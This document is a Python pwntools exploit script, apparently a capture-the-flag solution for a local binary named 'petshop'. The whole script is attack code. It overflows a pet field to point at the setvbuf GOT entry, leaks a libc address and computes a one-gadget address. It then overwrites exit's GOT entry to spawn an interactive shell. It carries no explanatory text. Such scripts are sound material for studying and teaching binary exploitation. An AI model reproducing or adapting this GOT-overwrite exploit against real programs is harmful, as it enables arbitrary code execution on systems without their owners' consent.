from pwn import *

s = process('./petshop') # libc : libc6_2.23-0ubuntu7_amd64.so

setvbuf_got = 0x604030
exit_got = 0x604028

def buy(num):
	s.recvuntil('select')
	s.sendline('1')
	s.recvuntil('select')
	s.sendline(str(num))

def sell():
	s.recvuntil('select')
	s.sendline('2')

def setpet(num,name,sound,feed):
	s.recvuntil('select')
	s.sendline('4')
	s.recvuntil('set:')
	s.sendline(str(num))
	s.recvuntil('name')
	s.sendline(name)
	s.recvuntil('sound')
	s.sendline(sound)
	s.recvuntil('feed')
	s.sendline(feed)

def p_list():
	s.recvuntil('select')
	s.sendline('5')
	s.recv(1024)

def setname(name):
	s.recvuntil('select')
	s.sendline('6')
	s.recvuntil('name?')
	s.sendline(name)

buy(1)
setname('AAAA')
setpet(1,'A','A','B' * 12 + p64(setvbuf_got) + '\x08' )
p_list()
setvbuf_add = u64(s.recv(100)[88:96])
libc_base = setvbuf_add - 0x6fe70
oneshot = libc_base + 0xef6c4
log.info('SETVBUF LEAK : ' + hex(setvbuf_add))
log.info('LIBC_BASE : ' + hex(libc_base))
log.info('ONESHOT : ' + hex(oneshot))

setpet(1,'A','A','B' * 12 + p64(exit_got) + '\x08')
setname(p64(oneshot))
s.sendline('7')
s.recv(1024)
s.recv(1024)

s.success('GET SHELL!')
s.interactive()
